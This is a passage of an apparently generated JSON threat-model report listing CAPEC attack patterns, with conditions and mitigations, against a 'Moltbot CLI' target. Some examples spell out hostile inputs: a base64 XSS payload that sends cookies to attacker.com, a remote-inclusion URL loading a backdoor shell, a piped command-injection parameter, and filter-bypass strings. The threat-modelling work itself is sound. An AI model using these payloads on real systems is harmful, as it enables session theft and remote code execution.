http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.usesSecureFunctions is False", "cvss": "", "description": "Buffer Manipulation", "details": "An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.", "example": "Attacker identifies programmatic means for interacting with a buffer, such as vulnerable C code, and is able to provide input to this interaction.", "id": "5", "mitigations": "To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.", "references": "https://capec.mitre.org/data/definitions/123.html, http://cwe.mitre.org/data/definitions/119.html", "response": "", "severity": "Very High", "target": "Moltbot CLI", "threat_id": "INP07"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False or target.controls.isResilient is False", "cvss": "", "description": "Flooding", "details": "An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.", "example": "Adversary tries to bring a network or service down by flooding it with large amounts of traffic.", "id": "6", "mitigations": "Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.", "references": "https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "DO01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "7", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Format String Injection", "details": "An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.", "example": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.", "id": "8", "mitigations": "Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.", "references": "https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP08"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False and target.controls.validatesInput is False", "cvss": "", "description": "Client-side Injection-induced Buffer Overflow", "details": "This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.", "example": "Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use EMBED tags in HTML documents. For example <EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.", "id": "9", "mitigations": "The client software should not install untrusted code from a non-authenticated server. The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers. Perform input validation for length of buffer inputs. Use a language or compiler that performs automatic bounds checking. Use an abstraction library to abstract away risky APIs. Not a complete solution. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Ensure all buffer uses are consistently bounds-checked. Use OS-level preventative functionality. Not a complete solution.", "references": "https://capec.mitre.org/data/definitions/14.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/353.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP12"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Command Delimiters", "details": "An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.", "example": "By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.", "id": "10", "mitigations": "Design: Perform whitelist validation against a positive specification for command length, type, and parameters.Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged accountImplementation: Perform input validation for all remote content.Implementation: Use type conversions such as JDBC prepared statements.", "references": "https://capec.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/146.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/154.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP13"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Input Data Manipulation", "details": "An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.", "example": "A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.", "id": "11", "mitigations": "Validation of user input for type, length, data-range, format, etc.", "references": "https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "INP14"}, {"assumption": null, "condition": "target.controls.implementsAuthenticationScheme is False", "cvss": "", "description": "Dictionary-based Password Attack", "details": "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.", "example": "A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096", "id": "12", "mitigations": "Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.", "references": "https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "CR03"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Principal Spoof", "details": "A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).", "example": "An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.", "id": "13", "mitigations": "Employ robust authentication processes (e.g., multi-factor authentication).", "references": "https://capec.mitre.org/data/definitions/195.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "AA02"}, {"assumption": null, "condition": "target.controls.disablesiFrames is False", "cvss": "", "description": "iFrame Overlay", "details": "In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on.", "example": "The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to his/ her Twitter profile.", "id": "14", "mitigations": "Configuration: Disable iFrames in the Web browser.Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.", "references": "https://capec.mitre.org/data/definitions/222.html, http://cwe.mitre.org/data/definitions/1021.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP20"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)", "cvss": "", "description": "File Content Injection", "details": "An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.", "example": "PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs. [R.23.2]", "id": "15", "mitigations": "Design: Enforce principle of least privilegeDesign: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.Implementation: Virus scanning on hostImplementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.", "references": "https://capec.mitre.org/data/definitions/23.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Very High", "target": "Moltbot CLI", "threat_id": "INP23"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Privilege Escalation", "details": "An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.", "example": "The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.", "id": "16", "mitigations": "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.", "references": "https://capec.mitre.org/data/definitions/233.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "AC12"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Hijacking a privileged process", "details": "An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code. Processes can be hijacked through improper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured.", "example": "The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.", "id": "17", "mitigations": "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.", "references": "https://capec.mitre.org/data/definitions/234.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/648.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "AC13"}, {"assumption": null, "condition": "target.controls.implementsPOLP is False and (target.usesEnvironmentVariables is True or target.controls.validatesInput is False)", "cvss": "", "description": "Catching exception throw/signal from privileged block", "details": "Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.", "example": "Attacker targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread. The Attacker could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.", "id": "18", "mitigations": "Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.", "references": "https://capec.mitre.org/data/definitions/236.html, http://cwe.mitre.org/data/definitions/270.html", "response": "", "severity": "Very High", "target": "Moltbot CLI", "threat_id": "AC14"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False or target.controls.validatesInput is False", "cvss": "", "description": "Filter Failure through Buffer Overflow", "details": "In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).", "example": "Attack Example: Filter Failure in Taylor UUCP Daemon Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.", "id": "19", "mitigations": "Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.Pre-design: Use a language or compiler that performs automatic bounds checking.Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.Operational: Use OS-level preventative functionality. Not a complete solution.Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.", "references": "https://capec.mitre.org/data/definitions/24.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/680.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP24"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Resource Injection", "details": "An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.", "example": "A Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as '../../tomcat/confserver.xml', which causes the application to delete one of its own configuration files.", "id": "20", "mitigations": "Ensure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.", "references": "https://capec.mitre.org/data/definitions/240.html, https://capec.mitre.org/data/definitions/240.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP25"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Code Injection", "details": "An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.", "example": "When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.", "id": "21", "mitigations": "Utilize strict type, character, and encoding enforcementEnsure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.", "references": "https://capec.mitre.org/data/definitions/242.html, http://cwe.mitre.org/data/definitions/94.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP26"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Targeting HTML Attributes", "details": "An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.", "example": "Application allows execution of any Javascript they want on the browser which enables the adversary to steal session tokens and perform malicious activities.", "id": "22", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list all input including that which is not expected to have any scripting content.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/243.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "INP27"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting URI Placeholders", "details": "An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.", "example": "The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.", "id": "23", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP28"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Doubled Characters", "details": "The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "example": "By doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "id": "24", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/245.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "INP29"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Using Invalid Characters", "details": "An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.", "example": "The software may attempt to remove a 'javascript:' URI scheme, but a 'java%00script:' URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.", "id": "25", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be included in any subsequent web pages or back end operations.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/247.html, https://cwe.mitre.org/data/definitions/86.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "INP30"}, {"assumption": null, "condition": "target.controls.usesParameterizedInput is False and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)", "cvss": "", "description": "Command Injection", "details": "An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.", "example": "Consider a URL 'http://sensitive/cgi-bin/userData.pl?doc=user1.txt'. If the URL is modified like so - 'http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|', it executed the command '/bin/ls|'. This is how command injection is implemented.", "id": "26", "mitigations": "All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary.Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.", "references": "https://capec.mitre.org/data/definitions/248.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP31"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XML Injection", "details": "An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.", "example": "Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.", "id": "27", "mitigations": "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.", "references": "https://capec.mitre.org/data/definitions/250.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP32"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Remote Code Inclusion", "details": "The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.", "example": "URL string http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor_ contains an external reference to a backdoor code file stored in a remote location (http://www.hacker.com/backdoor_shell.php.) Having been uploaded to the application, this backdoor can later be used to hijack the underlying server or gain access to the application database.", "id": "28", "mitigations": "Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.", "references": "https://capec.mitre.org/data/definitions/253.html", "response": "", "severity": "High", "target": "Moltbot CLI", "threat_id": "INP33"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Leverage Alternate Encoding", "details": "An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.", "example": "Microsoft Internet Explorer 5.01 